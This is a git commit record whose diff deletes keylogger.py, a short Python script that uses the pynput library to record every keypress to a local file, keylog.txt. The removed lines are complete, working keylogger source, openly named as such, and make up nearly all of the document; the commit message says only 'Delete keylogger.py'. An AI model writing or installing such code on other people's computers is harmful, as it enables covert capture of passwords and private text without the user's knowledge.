8374b9c2d408e16cf420c04b64018a1d418c2ca7
GAURIPATIL <125655950+GAURIPATIL-2004@users.noreply.github.com>
2025-03-07 19:32:43 +0530

    Delete keylogger.py

--- keylogger.py
+++
@@ -1,9 +0,0 @@
-from pynput.keyboard import Listener
-
-def log_key(key):
-    key = str(key).replace("'", "")  # Remove single quotes from key names
-    with open("keylog.txt", "a") as f:
-        f.write(key + "\n")
-
-with Listener(on_press=log_key) as listener:
-    listener.join()
